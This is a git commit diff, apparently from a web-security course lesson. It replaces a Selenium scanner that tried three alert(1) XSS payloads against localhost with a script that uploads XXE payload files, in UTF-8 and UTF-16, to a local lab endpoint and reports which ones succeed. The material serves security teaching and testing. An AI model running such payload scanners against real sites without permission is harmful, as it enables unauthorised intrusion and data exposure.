57dcfa9c31f1cc67faa94f647f049309a96f3ced
gregxsunday <gregxsunday@gmail.com>
2021-08-18 11:53:40 +0200

    added M06L03

--- m6/lekcja03.py
+++ m6/lekcja03.py
@@ -1,58 +1,65 @@
-from selenium import webdriver
-from selenium.common.exceptions import TimeoutException, InvalidSessionIdException, NoSuchElementException
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions
-from selenium.webdriver.common.action_chains import ActionChains
+import requests
+from os import listdir, path
+from bs4 import BeautifulSoup
 from termcolor import colored
-from time import sleep
 
-def create_driver():
-    chrome_options = webdriver.ChromeOptions()
-    chrome_options.add_argument('--headless') 
-    driver = webdriver.Chrome(options=chrome_options)
-    return driver
+def upload_file(sess, content, utf16=False):
+    url = "http://localtest.me:80/level2"
+    files = {
+        'file': (
+            'file.xml', 
+            content.encode('utf16') if utf16 else content,  
+            'text/xml'
+            )
+    }
+
+    resp = sess.post(url, files=files)
+    return resp
 
 
-def is_alert_present(driver, payload):
-    url = f'http://localhost/?name={payload}'
+def create_session():
+    sess = requests.Session()
+    sess.verify = False
+    return sess
 
-    try:
-        try:
-            driver.get(url)
-        except InvalidSessionIdException:
-            driver = create_driver()
-            driver.get(url)
 
-        try:
-            action = ActionChains(driver) 
-            xsslink = driver.find_element_by_name("xss")
-            action.move_to_element(xsslink).click().perform()
-        except NoSuchElementException:
-            pass
+def find_alert(soup):
+    alert = soup.find("div", attrs={'role': 'alert'})
+    return alert.string.strip() if alert else None
 
-        try:
-            WebDriverWait(driver, 0.5).until(expected_conditions.alert_is_present())
-            sleep(5)
-            driver.switch_to.alert.accept()
-            return True
-        except TimeoutException:
-            sleep(3)
-            return False
-    finally:
-        driver.close()
+
+def find_foo(soup):
+    foo = soup.find('h3')
+    return foo.string.strip() if foo else None
 
 
 if __name__ == '__main__':
-    payloads = [
-        '<script>alert(1)</script>',
-        '<img src=x onerror=alert(1)>',
-        '<input name="xss" onpointerenter=alert(1)>'
-    ]
-    driver = create_driver()
-    try:
-        for payload in payloads:
-            alert = is_alert_present(driver, payload)
-            print(payload, colored('VULNERABLE', 'red') if alert else colored('NOT VULNERABLE', 'green'))
-    finally:
-        driver.quit()
-    
+    payloads_directory = 'xxe-payloads'
+    payloads = listdir(payloads_directory)
+    sess = create_session()
+
+    for file in payloads:
+        for utf16 in [False, True]:
+            payload = path.join(payloads_directory, file)
+
+            with open(payload, 'r') as infile:
+                content = infile.read()
+
+            try:
+                resp = upload_file(sess, content, utf16=utf16)
+            except requests.exceptions.ConnectionError:
+                print(colored(payload, 'yellow'))
+                continue
+
+            soup = BeautifulSoup(resp.text, features="html.parser")
+            alert = find_alert(soup)
+            foo = find_foo(soup)
+
+            utf = 'UTF-16' if utf16 else 'UTF-8'
+
+            if foo:
+                print(f'{payload} {utf}', colored(foo.split('\n')[0], 'red'), end='\n\n', sep=': ')
+            elif alert:
+                print(f'{payload} {utf}', colored(alert, 'yellow'), end='\n\n', sep=': ')
+            else:
+                print(f'{payload} {utf}', colored('not vulnerable', 'yellow'))
